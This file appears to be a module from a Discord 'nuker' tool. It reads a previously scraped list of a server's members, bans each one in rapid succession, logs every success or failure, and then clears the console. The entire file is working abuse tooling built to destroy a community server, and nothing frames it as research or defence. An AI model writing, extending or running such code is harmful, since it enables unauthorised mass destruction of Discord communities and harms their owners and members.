import { white } from "chalk";
import scrapeModel from "../../models/scrape";
import { createString } from "../../utils/createString";
import { getTheme } from "../../utils/getTheme";
import { wizz } from "../wizz";

module.exports = async (client, db, rl, guildID) => {
  function nukeStr(str, type) {
    let mainColor = getTheme(db);
    let r = `              ${mainColor("[")}${white(
      type === "rateLimit"
        ? "!"
        : type === "success"
        ? "+"
        : type === "fail"
        ? "-"
        : ""
    )}${mainColor("]")} ${white(str)}`;
    return r;
  }
  let scrape = <unknown>await scrapeModel.findOne({
    Username: db.get("username"),
    Guild: guildID,
  });
  let server = client.guilds.cache.get(guildID);
  if (!scrape) {
    console.log(
      createString("No scrape data for the server", db, "semi", "fail")
    );
    setTimeout(() => {
      wizz(client, db, rl);
    }, 1000);
    return;
  }
  interface members {
    Members: String[];
  }
  let c = 1;
  let scraper = <members>scrape;
  let mainColor = getTheme(db);
  scraper.Members.forEach((member, i) => {
    let inter = setInterval(() => {
      if (c >= scraper.Members.length) {
        setTimeout(() => {
          wizz(client, db, rl);
          console.log(" ");
          console.log(
            createString(
              "Making sure console is clean.. Please wait",
              db,
              "semi"
            )
          );
          setTimeout(() => {
            console.clear();
            console.log(createString("Running second cleaning..", db, "semi"));
            setTimeout(() => {
              console.clear();
              wizz(client, db, rl);
            }, 700);
          }, 400);
        }, 500);
        clearInterval(inter);
      }
    }, 500);
    server.members
      .ban(member)
      .then(() => {
        process.title = `[External-Nuker] - Banned ${member}`;
        c++;
        console.log(nukeStr(`Banned member ${mainColor(member)}`, "success"));
      })
      .catch(() => {
        process.title = `[External-Nuker] - Failed to ban ${member}`;
        c++;
        console.log(
          nukeStr(`Failed to ban member ${mainColor(member)}`, "fail")
        );
      });
  });
};
